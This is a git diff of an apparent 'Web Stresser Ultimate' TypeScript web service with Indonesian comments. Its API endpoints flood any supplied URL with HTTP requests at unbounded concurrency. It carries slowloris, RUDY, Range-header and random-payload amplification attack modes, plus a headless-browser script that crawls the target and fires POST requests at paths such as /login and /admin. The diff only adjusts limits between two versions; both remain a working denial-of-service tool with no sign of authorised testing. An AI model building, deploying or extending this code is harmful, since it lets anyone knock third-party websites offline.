@@ -2,11 +2,11 @@ import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
 import autocannon from 'autocannon';
 
-// Konfigurasi koneksi pool (tanpa batasan)
+// Konfigurasi koneksi pool (tanpa batasan internal)
 const globalAgent = new Agent({
-  connections: Number.MAX_SAFE_INTEGER,
-  pipelining: 100,
-  keepAliveTimeout: 0, // tidak pernah timeout
+  connections: 200,
+  pipelining: 1,
+  keepAliveTimeout: 60000,
 });
 setGlobalDispatcher(globalAgent);
 
@@ -25,16 +25,14 @@ function randomString(n: number): string {
   return result;
 }
 
-// Amplifikasi hingga 10MB (10000 KB)
 function generateAmplificationPayload(kb: number, ampType: string): string {
   if (kb <= 0) return '';
   const size = kb * 1024;
   if (ampType === 'range') return '';
-  if (size > 10 * 1024 * 1024) return randomString(10 * 1024 * 1024); // max 10MB
   return randomString(size);
 }
 
-// ========== SINGLE ATTACK (tanpa batasan apapun) ==========
+// ========== SINGLE ATTACK (tanpa batasan) ==========
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -48,7 +46,6 @@ interface SingleAttackParams {
   amplifyKB: number;
   amplifyEnabled: boolean;
   amplifyType: string;
-  extraHeaders?: Record<string, string>;
 }
 
 async function singleAttack(params: SingleAttackParams): Promise<any> {
@@ -56,12 +53,11 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
     url, method, headers, body,
     timeout, retryCount, randomDelay,
     keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
-    extraHeaders,
   } = params;
 
   let finalMethod = method.toUpperCase();
   let finalUrl = url;
-  let finalHeaders = { ...headers, ...(extraHeaders || {}) };
+  let finalHeaders = { ...headers };
   let finalBody = body || '';
   let useBody = false;
 
@@ -72,7 +68,6 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
     ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
   }
 
-  // Attack type yang lebih merusak
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -91,11 +86,9 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       break;
     case 'slowloris':
       finalHeaders['Connection'] = 'keep-alive';
-      finalHeaders['Keep-Alive'] = 'timeout=999999, max=1000';
       break;
     case 'rudy':
-      // Simulasi slow POST dengan delay panjang
-      await new Promise(r => setTimeout(r, 5000));
+      await new Promise(r => setTimeout(r, 2000));
       if (amplifyEnabled && ampPayload) finalBody = body + ampPayload;
       else finalBody = body;
       useBody = true;
@@ -106,7 +99,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       useBody = true;
   }
 
-  // Untuk GET dengan amplification besar, paksa POST
+  // Aturan untuk GET dengan amplification besar
   if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
@@ -121,7 +114,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
   else finalHeaders['Connection'] = 'close';
 
-  // Tidak ada batasan timeout internal
+  // Tidak ada pembatasan timeout internal
   const fetchOptions: any = {
     method: finalMethod,
     headers: finalHeaders,
@@ -176,7 +169,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// ========== BATCH ATTACK (concurrency super tinggi) ==========
+// ========== BATCH ATTACK (tanpa batasan) ==========
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -192,14 +185,13 @@ interface BatchAttackParams {
   amplifyType: string;
   concurrency: number;
   total: number;
-  extraHeaders?: Record<string, string>;
 }
 
 async function batchAttack(params: BatchAttackParams): Promise<any> {
   const {
     url, method, headers, body, timeout, retryCount, randomDelay,
     keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
-    concurrency, total, extraHeaders,
+    concurrency, total,
   } = params;
 
   const startTime = Date.now();
@@ -212,7 +204,6 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     const result = await singleAttack({
       url, method, headers, body, timeout, retryCount, randomDelay,
       keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
-      extraHeaders,
     });
     if (result.success) totalSuccess++;
     else totalFail++;
@@ -220,7 +211,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     allLatencies.push(result.durationMs);
   };
 
-  // Tanpa batasan concurrency (asumsi server dapat handle)
+  // Tidak ada pembatasan concurrency atau total
   const workers: Promise<void>[] = [];
   let index = 0;
   for (let i = 0; i < concurrency; i++) {
@@ -247,7 +238,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     totalTimeMs: totalTime,
     avgLatencyMs: avgLatency,
     rps,
-    latencies: allLatencies.slice(0, 200),
+    latencies: allLatencies.slice(0, 100),
   };
 }
 
@@ -273,7 +264,7 @@ async function runAutocannon(options: AutocannonOptions): Promise<any> {
         method: (options.method || 'GET') as any,
         headers: options.headers,
         body: options.body,
-        pipelining: 100,
+        pipelining: 1,
         reconnectRate: 0,
       },
       (err: any, result: any) => {
@@ -295,8 +286,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia on Vercel (EXTREME MODE)',
-    version: '6.0.0',
+    message: 'Web Stresser Ultimate - Elysia on Vercel (FULL UNLIMITED)',
+    version: '5.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -319,7 +310,6 @@ export const app = new Elysia()
       amplifyKB: t.Number(),
       amplifyEnabled: t.Boolean(),
       amplifyType: t.String(),
-      extraHeaders: t.Optional(t.Record(t.String(), t.String())),
     }),
   })
   .post('/api/batch', async ({ body }) => {
@@ -345,7 +335,6 @@ export const app = new Elysia()
       amplifyType: t.String(),
       concurrency: t.Number(),
       total: t.Number(),
-      extraHeaders: t.Optional(t.Record(t.String(), t.String())),
     }),
   })
   .post('/api/autocannon', async ({ body }) => {
@@ -371,43 +360,42 @@ export const app = new Elysia()
     const apiKey = process.env.BROWSERLESS_API_KEY;
     if (!apiKey) return { success: false, error: 'Missing API key' };
 
-    // Script Browserless yang sangat agresif: mengunjungi banyak link, melakukan POST, scroll cepat, dan loop internal
+    // Script Browserless yang lebih sederhana dan stabil (tanpa manipulasi form yang error)
     const script = `
 export default async ({ page, context }) => {
   const targetUrl = context.url;
   await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
 
-  // 1. Scroll cepat dan banyak
+  // 1. Scroll perlahan
   await page.evaluate(async () => {
     let totalHeight = 0;
-    let distance = 1000;
+    let distance = 500;
     while (totalHeight < document.body.scrollHeight) {
       window.scrollBy(0, distance);
       totalHeight += distance;
-      await new Promise(resolve => setTimeout(resolve, 50));
+      await new Promise(resolve => setTimeout(resolve, 200));
     }
   });
 
-  // 2. Klik semua link (maks 50)
+  // 2. Kunjungi beberapa link unik (maks 10)
   const links = await page.$$eval('a', anchors => anchors.map(a => a.href).filter(h => h && h.startsWith('http')));
-  const uniqueLinks = [...new Set(links)].slice(0, 50);
+  const uniqueLinks = [...new Set(links)].slice(0, 10);
   for (const link of uniqueLinks) {
-    await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
-    await page.waitForTimeout(200);
-    await page.goBack().catch(() => {});
+    await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
+    await page.waitForTimeout(500);
+    await page.goBack();
   }
 
   // 3. Kembali ke halaman awal
   await page.goto(targetUrl, { waitUntil: 'networkidle2' });
 
-  // 4. Kirim POST dan DELETE ke endpoint umum
-  const endpoints = ['/api', '/login', '/submit', '/contact', '/search', '/delete', '/admin'];
-  for (const endpoint of endpoints) {
+  // 4. Kirim POST ke beberapa endpoint umum
+  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search'];
+  for (const endpoint of commonEndpoints) {
     const postUrl = new URL(endpoint, targetUrl).href;
     await page.evaluate(async (url) => {
       try {
-        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ _: Date.now() }) });
-        await fetch(url, { method: 'DELETE' });
+        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ test: true }) });
       } catch(e) {}
     }, postUrl);
   }
@@ -418,7 +406,7 @@ export default async ({ page, context }) => {
       ok: true,
       title,
       url: targetUrl,
-      linksProcessed: uniqueLinks.length,
+      linksFound: links.length,
     },
     type: 'application/json'
   };
